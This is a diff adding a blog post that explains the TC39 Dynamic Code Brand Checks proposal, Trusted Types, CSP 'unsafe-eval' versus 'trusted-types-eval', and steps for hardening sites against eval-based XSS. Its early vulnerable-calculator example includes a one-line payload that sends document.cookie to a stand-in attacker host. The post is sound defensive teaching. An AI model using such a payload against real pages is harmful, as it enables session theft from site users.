@@ -1,0 +1,457 @@
+import { buildPostMetadata } from "@/utils/post-metadata";
+
+export const metadata = buildPostMetadata("dynamic-code-brand-checks-trusted-types");
+
+## Introduction
+
+`eval()` and `new Function()` turn strings into running code. That's exactly why security teams want to switch them off,
+and exactly why so many sites can't: one dependency that builds a function from a string is enough to force the whole
+page to allow it.
+
+Trusted Types was designed to offer a middle ground: keep dynamic code, but only for strings that have been through a
+policy you wrote. For the DOM that works well. For `eval` it ran into a problem in the JavaScript language itself, and
+that's what the **Dynamic Code Brand Checks** proposal fixes.
+
+This post covers why `eval` is risky, how Content Security Policy and Trusted Types try to contain it, what was missing
+in ECMAScript, what the proposal changes, and what you can do on your own site today.
+
+<Info title="Status as of November 2026">
+  Dynamic Code Brand Checks is at **Stage 3**. It isn't Stage 4 yet, so it is **not part of ES2027** (at least not so
+  far). It was on the TC39 agenda in January and May 2026, and the proposals list records it as having no test262
+  tests: the objects it deals with are created by the host (the browser), so the behaviour has to be tested in
+  web-platform-tests instead.
+</Info>
+
+<RainbowDivider />
+
+## Key Terms at a Glance
+
+New to this area? These are the words the rest of the post leans on.
+
+| Term                  | Plain-English meaning                                                                                  |
+| --------------------- | ------------------------------------------------------------------------------------------------------ |
+| **Sink**              | A place where a string becomes something powerful: `eval()`, `innerHTML`, a `<script>` source           |
+| **XSS**               | Cross-site scripting: an attacker getting their code to run on your page                               |
+| **CSP**               | Content Security Policy: a response header telling the browser what the page may load and run          |
+| **Policy**            | A small function you write (and review) that decides whether a string may become trusted               |
+| **`TrustedScript`**   | An object the browser will accept at a script sink; only a policy can create one                       |
+| **Brand check**       | The browser confirming a value really is a `TrustedScript`, without believing anything the value says  |
+| **Host hook**         | A spot where the JavaScript spec lets the browser (the "host") step in and veto an operation           |
+
+<RainbowDivider />
+
+## Why `eval` and `new Function` Are Risky
+
+Both functions compile a string at runtime and run it with the full power of your page: cookies that aren't
+`HttpOnly`, the DOM, `fetch` to your own API with the user's session. If any part of that string comes from an attacker
+(a URL parameter, a stored comment, a `postMessage` payload), they get to run their code as if it were yours. That's a
+DOM-based cross-site scripting (XSS) bug.
+
+<CodeBlock language="js">
+{`
+  // A "calculator" that trusts the URL. Never do this.
+  const expression = new URLSearchParams(location.search).get("expr");
+  const result = eval(expression);
+
+  // ?expr=fetch("https://attacker.example/?c=" + document.cookie)
+`}
+</CodeBlock>
+
+Code review doesn't catch every case either, because `Function` can be reached without ever writing its name. The
+proposal's README uses this example:
+
+<CodeBlock language="js">
+{`
+  const x = "constructor";
+  const y = "return 6 * 7";
+
+  ({}[x][x](y)()); // 42
+
+  // ({})[x]     is Object
+  // ({})[x][x]  is Function
+  // ({})[x][x](y) is the same as Function(y)
+`}
+</CodeBlock>
+
+The same applies to the string forms of `setTimeout()` and `setInterval()`, which compile their first argument when
+it isn't a function.
+
+<RainbowDivider />
+
+## Content Security Policy and `'unsafe-eval'`
+
+Content Security Policy (CSP) lets a page tell the browser what it may load and run. As soon as a policy has a
+`script-src` (or a `default-src` it falls back to), string compilation is blocked unless the policy also contains
+`'unsafe-eval'`:
+
+<CodeBlock language="text">
+{`
+  Content-Security-Policy: script-src 'self'
+`}
+</CodeBlock>
+
+With that header, `eval("1 + 1")` throws an `EvalError` and the browser reports a violation. That's a great default,
+but it's all or nothing. If a single library does something like `Function("return this")()` to find the global
+object (older polyfills did exactly that), the only way to keep it working is to add `'unsafe-eval'`, which allows
+**every** string compilation on the page, including the attacker-controlled ones.
+
+Node.js has the same switch: `node --disallow-code-generation-from-strings` makes `eval()` and `new Function()` throw
+an `EvalError` for the whole process, with the same trade-off.
+
+<RainbowDivider />
+
+## Trusted Types in a Nutshell
+
+Trusted Types changes the question from "is dynamic code allowed?" to "has this value been approved?". You turn it on
+with a CSP directive:
+
+<CodeBlock language="text">
+{`
+  Content-Security-Policy: require-trusted-types-for 'script'; trusted-types calc
+`}
+</CodeBlock>
+
+From then on, risky sinks such as `innerHTML`, `<script>` sources and `eval()` refuse plain strings. They want a typed
+object instead, and the only way to make one is through a **policy** you create with `trustedTypes.createPolicy()`.
+The `trusted-types calc` part of the header limits which policy names the page may create.
+
+<CodeBlock language="js">
+{`
+  const calcPolicy = trustedTypes.createPolicy("calc", {
+    createScript(input) {
+      // Digits, whitespace, + - * / ( ) and dots only.
+      if (!/^[\\d\\s+\\-*/().]+$/.test(input)) {
+        throw new TypeError("Only arithmetic is allowed");
+      }
+      return input;
+    },
+  });
+
+  const script = calcPolicy.createScript("(2 + 3) * 4");
+
+  console.log(script instanceof TrustedScript); // true
+  console.log(script.toString()); // "(2 + 3) * 4"
+  console.log(trustedTypes.isScript(script)); // true
+`}
+</CodeBlock>
+
+A `TrustedScript` is an object that wraps a string in an internal, immutable slot. You can't build one yourself, you
+can't change its contents, and the browser can check its **brand** (that it really came from a policy) without
+trusting anything the object says about itself. Security review then shrinks to the handful of `createScript`
+functions on the page, instead of every place a string might reach a sink.
+
+There's also an optional policy named `"default"`. When a plain string reaches a sink, the browser passes it to the
+default policy's matching function (here `createScript`) along with the type and the sink name, which is handy for
+migrating legacy code. If there's no default policy, or it returns `null` or `undefined`, the sink is blocked.
+
+<RainbowDivider />
+
+## The Gap: Where `eval` and Trusted Types Didn't Meet
+
+For DOM sinks, browsers could simply check the type of the value being assigned. `eval()` and `new Function()` are
+different, because they're defined by ECMAScript, and the language spec got in the way in three places.
+
+### 1. `eval` returns anything that isn't a string
+
+The spec's `PerformEval` starts with "if the argument isn't a String, return it". So `eval()` never even looks at an
+object:
+
+<CodeBlock language="js">
+{`
+  console.log(eval(123) === 123); // true
+
+  const array = ["alert(1)"];
+  console.log(eval(array) === array); // true, and nothing alerts
+
+  const touchy = {
+    toString() {
+      throw new Error("never called");
+    },
+  };
+  console.log(eval(touchy) === touchy); // true, toString() isn't called
+`}
+</CodeBlock>
+
+That means `eval(trustedScript)` would hand the object straight back instead of running it. The only way to get code
+into `eval` was a string, and a string carries no proof of where it came from.
+
+### 2. The host hook only saw strings
+
+ECMAScript gives the host one chance to veto string compilation: an abstract operation called
+`HostEnsureCanCompileStrings`. CSP is implemented through it. But it received only the realm, the parameter strings,
+the body string and a "direct eval?" flag. By that point `new Function(trustedScript)` had already converted its
+arguments with `ToString()`, so the browser couldn't tell whether the original was a `TrustedScript` or an
+attacker's string with the same text.
+
+<CodeBlock language="js">
+{`
+  // new Function already accepts objects, by stringifying them:
+  const body = { toString: () => "return 6 * 7" };
+
+  console.log(new Function(body)()); // 42
+`}
+</CodeBlock>
+
+### 3. The host hook never saw the full code
+
+For `new Function("a", "b", "return a + b")`, the hook got the pieces separately, not the source text that's actually
+compiled (`function anonymous(a,b\n) {\nreturn a + b\n}`). A default policy that wants to inspect or log what's about
+to run needs the assembled code, not fragments.
+
+<RainbowDivider />
+
+## What the Proposal Changes
+
+The proposal makes two small changes to ECMAScript. Neither changes what existing code does.
+
+**Code-like objects.** A new host hook, `HostGetCodeForEval(argument)`, lets the host say "this object stands for this
+string of code". `PerformEval` asks it whenever `eval` gets an object. The default answer is "no code", so in an
+engine with no host objects of that kind (or for any ordinary object) `eval(obj)` still returns `obj`, exactly as
+today. Only objects the host recognises, such as a `TrustedScript`, are unwrapped and evaluated. User code can't
+create code-like values itself; they only come from host APIs like `createScript()`.
+
+**A richer `HostEnsureCanCompileStrings`.** The hook gains four arguments:
+
+| New argument      | What the host receives                                                  |
+| ----------------- | ----------------------------------------------------------------------- |
+| `codeString`      | The full source text that is about to be compiled                       |
+| `compilationType` | Which route got here: `direct-eval`, `indirect-eval` or `function`      |
+| `parameterArgs`   | The original `new Function` parameter values, before `ToString()`       |
+| `bodyArg`         | The original `eval` argument or `new Function` body, before `ToString()` |
+
+`CreateDynamicFunction` (the machinery behind `new Function`, and the generator and async variants) is also reordered
+so the check runs **after** the function source has been assembled, which is what makes `codeString` available.
+
+With the original values in hand, the browser can brand-check them. The CSP spec's version of the hook does roughly
+this:
+
+1. If the body and every parameter are `TrustedScript` objects, the code is trusted.
+2. Otherwise, pass the full code string to the default policy's `createScript` with the sink name `"eval"` or
+   `"Function"`. If that throws, or returns something different from the input, throw an `EvalError`.
+3. Then apply the normal `script-src` rules.
+
+Here is the same decision as a flowchart. Read it from the top: every call to `eval()` or `new Function()` enters
+once, then falls through the checks in order. Blue boxes are questions, the green box is the "trusted" outcome and the
+red box is the "blocked" one. Each "yes" arrow goes right to the green box, and each "no" arrow goes down.
+
+<TrustedScriptGateDiagram />
+
+The diagram adds three things the list above can't show on its own:
+
+- **The order is fixed.** The brand check always runs first, so a real `TrustedScript` never reaches the default policy
+  and the policy can't weaken what the brand check already approved.
+- **Both "yes" arrows end in the same place.** A value is trusted either because a policy created it (step 1) or because
+  the default policy vouched for it (step 2). Only the first is a guarantee you can review in one spot, which is why the
+  default policy is best treated as a temporary migration aid.
+- **Trusted is not the same as allowed.** The last box sits below the green one because both routes still have to pass
+  `script-src`. That's the job of `'trusted-types-eval'` (or the much blunter `'unsafe-eval'`), covered next.
+
+<RainbowDivider />
+
+## The `'trusted-types-eval'` Keyword
+
+Step 3 used to leave a problem: to let trusted code through `eval`, you still needed `'unsafe-eval'` in `script-src`.
+In a browser without Trusted Types enforcement, that opens up eval completely. CSP Level 3 adds a keyword for this
+case:
+
+<CodeBlock language="text">
+{`
+  Content-Security-Policy:
+    script-src 'self' 'trusted-types-eval';
+    require-trusted-types-for 'script';
+    trusted-types calc
+`}
+</CodeBlock>
+
+`'trusted-types-eval'` allows string compilation **only while Trusted Types is being enforced** for scripts. In a
+browser that enforces Trusted Types, `eval(calcPolicy.createScript("2 + 2"))` runs and `eval("2 + 2")` is blocked
+(unless a default policy approves it). In a browser that doesn't, the keyword has no effect, so `eval` stays blocked
+there too. You never accidentally fall back to "anything goes".
+
+<CodeBlock language="js">
+{`
+  // With the header above, in a browser that enforces Trusted Types:
+  eval(calcPolicy.createScript("(2 + 3) * 4")); // 20
+  eval("(2 + 3) * 4"); // throws EvalError: no default policy approved it
+
+  // new Function: the body is trusted, but the parameter "n" is a plain string.
+  new Function("n", calcPolicy.createScript("2 * 2")); // throws EvalError
+`}
+</CodeBlock>
+
+That last call is a useful reminder: for `new Function`, **every** argument, parameters included, has to be a
+`TrustedScript` for the call to count as trusted. If one of them is a plain string, the whole call goes through the
+default policy instead. Write the policy for the strings you actually pass.
+
+<RainbowDivider />
+
+## Try It Yourself
+
+The playground below follows the three steps from the flowchart. Pick a snippet, choose how it reaches `eval()` or
+`new Function()`, and switch the page's protections on or off. Each run prints the steps in order, so you can see
+which one decides the outcome.
+
+<Sandbox slug="dynamic-code-brand-checks-trusted-types" defaultLayout="vertical" />
+
+A few runs worth trying:
+
+- **A plain string with enforcement on and no default policy.** Step 2 has nobody to ask, so you get an `EvalError`.
+- **The same string with the default policy installed.** The policy approves arithmetic, so it runs, which is why a
+  default policy is only a stepping stone.
+- **A `TrustedScript` through `new Function("n", body)`.** The body is trusted but the parameter isn't, so the call
+  goes to the default policy instead.
+- **The look-alike object through `eval()`.** `eval` hands the object straight back, because it isn't a string.
+- **`alert(document.cookie)` as a `TrustedScript`.** The `calc` policy refuses to create one, so nothing reaches `eval`
+  at all.
+
+The "Your browser, for real" box at the bottom isn't a model: it reports what your own browser does with
+`trustedTypes` and `eval(TrustedScript)`.
+
+<Info title="What is real and what is modelled">
+  `createPolicy()`, `createScript()`, `trustedTypes.isScript()` and `eval(object)` all run in your browser. The
+  three-step gate is a model of the CSP check, because a page inside a sandbox can't set its own response headers.
+  Only arithmetic is ever executed.
+</Info>
+
+<RainbowDivider />
+
+## Browser Support
+
+| Feature                                                         | Chrome / Edge | Firefox | Safari |
+| --------------------------------------------------------------- | ------------- | ------- | ------ |
+| Trusted Types (`trustedTypes`, `TrustedScript`, CSP directives) | 83            | 148     | 26     |
+| `'trusted-types-eval'` in `script-src`                          | 145           | 148     | 26     |
+
+Trusted Types reached Chrome, Edge, Firefox and Safari with Firefox 148 (February 2026), so it's
+[**Baseline newly available**](/post/javascript/backwards-compatible-javascript#baseline). The TC39 proposal is the ECMAScript half of the same work: browsers implement the behaviour in their own
+engines, and the proposal brings the language spec in line so the hooks are standard rather than browser-specific.
+
+Not every engine supports `eval(TrustedScript)` in the same way, and a polyfill can't emulate it, because a polyfilled
+`TrustedScript` is an ordinary object that `eval` simply returns. The Trusted Types spec suggests feature-detecting it
+with the built-in empty script:
+
+<CodeBlock language="js">
+{`
+  // Native support runs the empty script and returns undefined (falsy).
+  // Without it, eval returns the object itself (truthy).
+  const supportsTrustedEval = !eval(trustedTypes.emptyScript);
+
+  const trustedCode = calcPolicy.createScript("(2 + 3) * 4");
+  eval(supportsTrustedEval ? trustedCode : trustedCode.toString()); // 20
+`}
+</CodeBlock>
+
+That check calls `eval`, so only run it on pages whose CSP allows `eval` in the first place (with
+`'trusted-types-eval'` or `'unsafe-eval'`).
+
+<RainbowDivider />
+
+## What You Can Do Today
+
+You don't need to wait for Stage 4 to benefit. The proposal tidies up the spec, but the protection already works in
+browsers that ship Trusted Types. Start by sending a report-only policy, which changes nothing for users but reports
+what an enforced one would block:
+
+<CodeBlock language="text">
+{`
+  Content-Security-Policy-Report-Only: script-src 'self'; report-to csp
+`}
+</CodeBlock>
+
+1. **Find your `eval` calls.** Violations with a resource of `"eval"` in those reports show you every string
+   compilation, including the ones in dependencies.
+2. **Remove what you can.** Most `eval` use has a safer replacement: `JSON.parse()` for data, a lookup object instead
+   of building a function name, `globalThis` instead of `Function("return this")()`, and dynamic `import()` for loading
+   code.
+3. **Wrap what's left in a policy.** Keep the `createScript` function small and strict, and give it a name you list in
+   `trusted-types`. Review changes to it the way you'd review changes to your authentication code.
+4. **Turn on Trusted Types in report-only mode first.** `Content-Security-Policy-Report-Only: require-trusted-types-for
+   'script'` reports every plain string that reaches a sink without breaking anything.
+5. **Use `'trusted-types-eval'`, not `'unsafe-eval'`,** when you need trusted dynamic code and want a policy that
+   fails closed in older browsers.
+6. **Keep a default policy temporary.** It's a migration tool. A default policy that returns its input unchanged turns
+   Trusted Types off for every sink it covers.
+7. **On the server, consider `--disallow-code-generation-from-strings`** for Node.js processes that never need
+   dynamic code.
+
+<RainbowDivider />
+
+## Which Approach Fits?
+
+| Situation                                              | Reach for                                                              |
+| ------------------------------------------------------ | ---------------------------------------------------------------------- |
+| You don't need dynamic code                            | Remove `eval`, and keep `'unsafe-eval'` out of `script-src`            |
+| A few trusted places build code from strings           | A small policy plus `'trusted-types-eval'`                             |
+| A dependency calls `eval` and you can't change it yet  | A temporary default policy, in report-only mode first                  |
+| A server-side Node.js process                          | `--disallow-code-generation-from-strings`                              |
+| You can't tell what your page does yet                 | `Content-Security-Policy-Report-Only` to collect violations            |
+
+<RainbowDivider />
+
+## Where the Proposal Stands
+
+| Milestone                     | Status (November 2026)                                                     |
+| ----------------------------- | -------------------------------------------------------------------------- |
+| TC39 stage                    | Stage 3                                                                    |
+| Recent TC39 meetings          | January 2026 and May 2026                                                  |
+| test262                       | No tests: code-like objects are host-defined, so testing lives in WPT      |
+| ECMAScript edition            | Not in ES2027 so far; it needs Stage 4 first                               |
+| Web platform side             | Trusted Types and `'trusted-types-eval'` ship in all three engines         |
+
+Stage 4 requires shipping implementations and conformance tests. With no way to test code-like objects in test262,
+the web-platform-tests suite does that job. When the proposal reaches Stage 4, it'll join whichever edition is open at
+the time. For what has already made the cut, see
+[What's New in ES2027: Temporal, using and More](/post/javascript/whats-new-in-es2027).
+
+<RainbowDivider />
+
+## Frequently Asked Questions
+
+<Details summary="Is Dynamic Code Brand Checks part of ES2027?">
+  Not as of November 2026. It's at Stage 3, and only Stage 4 proposals are added to an edition. ES2027 is finalised
+  around June 2027, so it could still make it if it reaches Stage 4 before then, but that hasn't happened yet.
+</Details>
+
+<Details summary="Does this proposal change how eval behaves in my code?">
+  No, not unless your host creates code-like objects. For strings, numbers, arrays and ordinary objects, `eval` behaves
+  exactly as before. The only visible difference is that `eval(trustedScript)` runs the wrapped code in browsers that
+  support it, instead of returning the object.
+</Details>
+
+<Details summary="What's the difference between 'unsafe-eval' and 'trusted-types-eval'?">
+  `'unsafe-eval'` allows all string compilation as far as `script-src` is concerned. `'trusted-types-eval'` allows it
+  only while Trusted Types is enforced for scripts, so plain strings still have to pass a policy, and in a browser
+  without Trusted Types enforcement it allows nothing.
+</Details>
+
+<Details summary="Can I create a TrustedScript without a policy?">
+  No. The constructor isn't callable from your code, and objects that merely look similar (or a polyfill's objects)
+  don't pass the brand check. The one exception is `trustedTypes.emptyScript`, a built-in `TrustedScript` holding an
+  empty string.
+</Details>
+
+<Details summary="Does Trusted Types make eval safe?">
+  It makes it reviewable. The code you pass through a policy still runs with full privileges, so a policy that accepts
+  anything is no better than `'unsafe-eval'`. Keep policies narrow, and prefer removing `eval` altogether when you can.
+</Details>
+
+<Details summary="Does any of this apply to Node.js?">
+  Node.js doesn't implement Trusted Types. Its equivalent control is `--disallow-code-generation-from-strings`, which
+  makes `eval()` and `new Function()` throw an `EvalError`. The proposal's spec hooks are there for any host to use,
+  though.
+</Details>
+
+<RainbowDivider />
+
+## Wrapping Up
+
+`eval` and `new Function` were the last big sinks Trusted Types couldn't cleanly cover, because ECMAScript threw away
+the information browsers needed: `eval` ignored objects, and the host hook only saw strings, in pieces. Dynamic Code
+Brand Checks fixes both by letting hosts define code-like objects and handing the hook the full code, the compilation
+type and the original arguments.
+
+- The proposal is at **Stage 3**, not Stage 4, and **not in ES2027** as of November 2026.
+- Trusted Types (`require-trusted-types-for 'script'`, `createPolicy()`, `createScript()`) works in Chrome, Edge,
+  Firefox and Safari today.
+- `'trusted-types-eval'` lets policy-approved code through `eval` without the blanket risk of `'unsafe-eval'`.
+- The best `eval` is still the one you delete, so audit first and wrap only what's left.
